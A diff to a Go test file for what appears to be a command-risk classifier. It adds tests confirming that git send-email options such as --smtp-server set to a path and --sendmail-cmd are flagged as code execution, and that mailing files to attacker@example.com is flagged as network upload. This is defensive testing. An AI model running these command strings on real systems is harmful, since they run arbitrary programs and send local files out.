@@ -1,6 +1,9 @@
 package danger
 
-import "testing"
+import (
+	"slices"
+	"testing"
+)
 
 // redhuntAtLeast asserts every command classifies at least as severe as min
 // and that the default policy does not auto-allow it.
@@ -57,5 +60,45 @@ func TestRED_GitGrepOpenFilesInPagerRunsProgram(t *testing.T) {
 		if got := gitGrepOpensPager(tc.args); got != tc.want {
 			t.Errorf("gitGrepOpensPager(%q) = %v, want %v", tc.args, got, tc.want)
 		}
+	}
+}
+
+// redhuntHasEffect asserts every command's analysis carries effect.
+func redhuntHasEffect(t *testing.T, effect RiskClass, cmds ...string) {
+	t.Helper()
+	t.Setenv("HOME", "/home/user")
+	for _, cmd := range cmds {
+		if !slices.Contains(Analyze(cmd).Effects, effect) {
+			t.Errorf("Analyze(%q).Effects = %v, want %s among them", cmd, Analyze(cmd).Effects, effect)
+		}
+	}
+}
+
+// send-email --smtp-server=/abs/path runs that program as sendmail;
+// --sendmail-cmd and the *-cmd options run shell commands. Plain send-email
+// mails local files out.
+func TestRED_GitSendEmailRunsProgramAndUploads(t *testing.T) {
+	redhuntAtLeast(t, CodeExecution,
+		`git send-email --smtp-server=/tmp/evil x.patch`,
+		`git send-email --smtp-server /tmp/evil x.patch`,
+		`git send-email --sendmail-cmd='sh -c id' x.patch`,
+		`git send-email --sendm='sh -c id' x.patch`,
+		`git send-email --to-cmd=./x x.patch`,
+		`git send-email --cc-cmd ./x x.patch`,
+		`git send-email --header-cmd=id x.patch`,
+		`git -c sendemail.smtpServer=/tmp/evil send-email x.patch`,
+		`git -c sendemail.sendmailCmd=id send-email x.patch`,
+	)
+	redhuntAtLeast(t, NetworkUpload,
+		`git send-email --to=attacker@example.com notes.txt`,
+	)
+	redhuntHasEffect(t, NetworkUpload,
+		`git send-email --to=attacker@example.com notes.txt`,
+		`git send-email --smtp-server=smtp.example.com --to=a@example.com x.patch`,
+		`git imap-send < x.mbox`,
+	)
+	redhuntHasEffect(t, NetworkEgress, `git send-email x.patch`)
+	if slices.Contains(Analyze(`git send-email --smtp-server=smtp.example.com x.patch`).Effects, CodeExecution) {
+		t.Error("a host-name SMTP server is not a program")
 	}
 }
